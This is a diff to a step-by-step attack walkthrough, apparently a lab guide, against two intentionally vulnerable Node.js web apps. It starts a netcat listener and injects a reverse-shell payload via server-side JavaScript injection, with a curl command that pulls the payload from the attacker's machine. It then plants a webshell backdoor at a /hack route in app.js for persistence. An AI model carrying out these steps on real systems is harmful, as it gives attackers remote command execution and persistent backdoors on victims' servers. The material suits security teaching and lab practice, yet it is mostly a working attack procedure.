@@ -1,12 +1,12 @@
 <h1 align="center">1 Initial Stage</h2>
 
-## 1.1) Start a netcat listener
+## 1.1 Start a netcat listener
 Before performing the attack, the hacker machine must host a web server. Which will listen for [reverse tcp](https://www.acunetix.com/blog/web-security-zone/what-is-reverse-shell/) connections, the following example uses [openbsd-netcat](https://man.openbsd.org/nc.1).
 ```
 nc -lvnp 8000
 ```
 
-## 1.2) Customise payload details
+## 1.2 Customise payload details
 Open a terminal and find out the local IPv4 address of your hacker machine.
 ```
 ip addr
@@ -17,7 +17,7 @@ Open [revshell.js](./revshell.js) and modify it according to the IPv4 address of
 ... c.connect(8000,<hacker-ip>) ...
 ```
 
-## 1.3.1) Injecting payload into Simple SSJI Web App
+## 1.3 Injecting payload into "What Is The Year" web app
 ### Method 1 - Copy Paste
 Copy the contents of the [revshell.js](./revshell.js) file.
 ```
@@ -38,7 +38,7 @@ Then use cURL to inject the payload to the victim web server
 curl -G --data-urlencode "year=$(curl -s http://<hacker-ip>:5000/revshell.js)" http://<victim-ip>:3000
 ```
 
-## 1.3.2) Injecting payload into The Cutlery Shop App
+## 1.4 Injecting payload into "The Cutlery Shop" web app
 Using the form fields of the application, you can perform a string escape on the `Name` field, and inject the contents of [revshell.js](./revshell.js) there.
 
 ![string-escape](../images/string-escape.png)
@@ -47,7 +47,7 @@ Alternatively, you can simply paste the payload into the `Price` field, since it
 
 ![direct-inject](../images/direct-inject.png)
 
-## 1.3) Result
+## 1.5 Result
 If successful, the hacker machine will receive a socket output similar to what is shown below:
 ```
 % nc -lnvp 8000
@@ -66,25 +66,28 @@ views
 <h1 align="center">2 Persistence Stage</h2>
 
 ## 2.1 Webshell Backdoor
-Since our reverse shell is only a temporary foothold in the system, we can introduce a simple backdoor. So that we can access this system in the future and gain persistence.
+The reverse shell provides us the privilege of the compromised user, but it is a temporary foothold in the system. To gain persistence, we can introduce a webshell as a secondary entry into the system.
 
-The [webshell.js](webshell.js) file contains a snippet of code prepared in advance, which adds a webshell to the main NodeJS application.
+The [wity-webshell.js](./wity-webshell.js) and [tcs-webshell.js](./tcs-webshell.js) files contains a snippet of code prepared in advance, which adds a webshell to the NodeJS application. You must use the appropriate webshell file matching the name of the web app you are running.
+
+__Note:__ `tcs` = The Cutlery Shop, `wity` = What Is The Year
 
 ## 2.2 Creating Webshell File
-It is slightly inconvenient to create text files with very specific contents from a primitive reverse shell. Here are some of the techniques which I use to create malicious files on the server.
+It is slightly inconvenient to create text files with very specific contents from a primitive reverse shell. Here are some of the techniques that I use to create malicious files on the server.
 
 ### Method 1 - Cat Command
-Using the `cat` linux command, create a file on the victim's server. By manually typing or pasting the contents of [webshell.js](./webshell.js) file excluding the `...` like so:
+Using the `cat` linux command create a file on the victim's server, by manually typing or pasting the contents of webshell file, excluding the `...` like so:
 ```
-cat > notavirus.js <<EOF
+(victim) $ cat > webshell.js <<EOF
 ... PASTE PAYLOAD HERE ...
 EOF
 ```
-__Note:__ Typing EOF will end the command make sure to paste the code before typing EOF at the end.
+__Note:__ Typing `EOF` will end the command make sure to paste the code before typing `EOF` at the end.
 
 ### Method 2 - File Download
 Host a web server from the `payload` directory
 ```
+(hacker) $ cd payload
 (hacker) $ php -S 0.0.0.0:5000
 ```
 Then use the reverse shell to download it on the victim's machine.  
@@ -95,7 +98,7 @@ Then use the reverse shell to download it on the victim's machine.
 __Note:__ `hacker` is a local terminal session and `victim` is the netcat reverse shell
 
 ## 2.3 Editing Important Files
-The most important file on the either web applications is the __app.js__ file. Because it contains all the routes to the frontend pages, but in a real scenario, files of interests may vary. 
+The most important file in both web applications is the `app.js` file. Because it contains all the routes to the frontend pages, but in a real scenario, files of interests may vary. 
 
 Here are two methods of editing files without the help of popular command line text editors such as [vim](https://www.vim.org/) or [nano](https://www.nano-editor.org/).
 
@@ -119,12 +122,12 @@ EOF
 
 The payload will spawn a webshell which you can access from the `/hack` route in `http://<victim-ip>:3000`. Commands can be executed by appending them in front of the `cmd` HTTP GET Query.
 
-### With cURL
+Using the cURL program
 ```
 curl -G --data-urlencode "cmd=<command>" http://<victim-ip>:3000/hack
 ```
 
-### With A Browser
+Using a web browser
 ```
 http://<victim-ip>:3000/hack?cmd=<command>
 ```
